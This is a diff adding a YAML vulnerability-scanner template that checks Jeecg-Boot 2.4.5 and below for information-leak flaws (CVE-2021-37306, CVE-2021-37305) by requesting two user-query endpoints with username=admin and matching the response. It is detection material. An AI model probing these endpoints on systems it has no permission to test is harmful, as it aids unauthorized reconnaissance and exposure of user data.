@@ -1,0 +1,42 @@
+id: jeecg-boot-info-leakage
+
+info:
+  name: Jeecg-Boot Information Leakage Vulnerabilities
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Jeecg-Boot versions 2.4.5 and below contain insecure permission vulnerabilities. Attackers can leverage these vulnerabilities to elevate privileges and access sensitive information via specific URIs.
+  tags: jeecg-boot,info-leak,cve
+  classification:
+    cve-id:
+      - CVE-2021-37306
+      - CVE-2021-37305
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/jeecg-boot/sys/user/checkOnlyUser?username=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "username"
+          - "admin"
+          - "success"
+
+  - method: GET
+    path:
+      - "{{BaseURL}}/jeecg-boot/sys/user/querySysUser?username=admin"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "username"
+          - "admin"
+          - "success"
